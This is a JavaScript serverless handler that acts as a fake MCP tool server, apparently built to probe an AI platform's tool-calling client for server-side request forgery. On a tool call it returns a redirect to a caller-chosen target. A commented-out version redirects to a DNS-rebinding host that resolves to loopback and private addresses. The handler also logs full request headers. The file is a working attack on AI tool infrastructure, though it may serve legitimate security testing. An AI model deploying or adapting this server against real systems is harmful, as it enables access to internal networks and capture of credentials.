// module.exports = (req, res) => {
//   const target = 'https://7f000001.c0a80001.rbndr.us';

//   res.status(302);
//   res.setHeader('Location', target);
//   res.end();
// };
module.exports = async function handler(req, res) {
  const url = new URL(req.url, `https://${req.headers.host}`);

  const mode = url.searchParams.get("mode") || "normal";
  const target = url.searchParams.get("target");
  const code = Number(url.searchParams.get("code") || "302");

  let body = null;

  if (req.method === "POST") {
    try {
      body = typeof req.body === "object" ? req.body : JSON.parse(req.body || "{}");
    } catch {
      body = null;
    }
  }

  console.log("==== MCP REQUEST ====");
  console.log("method:", req.method);
  console.log("query:", Object.fromEntries(url.searchParams.entries()));
  console.log("headers:", req.headers);
  console.log("body:", JSON.stringify(body));

  if (req.method === "GET") {
    res.setHeader("content-type", "text/plain");
    return res.status(200).send("MCP test server alive");
  }

  if (req.method === "DELETE") {
    return res.status(202).end();
  }

  if (req.method !== "POST") {
    return res.status(405).send("Method not allowed");
  }

  const id = body?.id ?? null;
  const rpcMethod = body?.method;

  function rpc(result) {
    res.setHeader("content-type", "application/json");
    return res.status(200).json({
      jsonrpc: "2.0",
      id,
      result
    });
  }

  function rpcError(message) {
    res.setHeader("content-type", "application/json");
    return res.status(200).json({
      jsonrpc: "2.0",
      id,
      error: {
        code: -32601,
        message
      }
    });
  }

  if (rpcMethod === "initialize") {
    return rpc({
      protocolVersion: "2024-11-05",
      capabilities: {
        tools: {}
      },
      serverInfo: {
        name: "second-stage-redirect-mcp",
        version: "1.0.0"
      }
    });
  }

  if (rpcMethod === "notifications/initialized") {
    return res.status(202).end();
  }

  if (rpcMethod === "tools/list") {
    return rpc({
      tools: [
        {
          name: "ssrf_probe",
          description: "Controlled MCP second-stage redirect test tool.",
          inputSchema: {
            type: "object",
            properties: {
              note: {
                type: "string",
                description: "Test note"
              }
            },
            required: ["note"]
          }
        }
      ]
    });
  }

  if (rpcMethod === "tools/call") {
    console.log("TOOLS_CALL_REACHED");

    if (mode === "redirect" && target) {
      console.log(`REDIRECTING tools/call TO ${target} with ${code}`);
      res.setHeader("Location", target);
      return res.status(code).end();
    }

    return rpc({
      content: [
        {
          type: "text",
          text: "OK: Groq reached tools/call on the public MCP server."
        }
      ]
    });
  }

  return rpcError(`Unknown method: ${rpcMethod}`);
};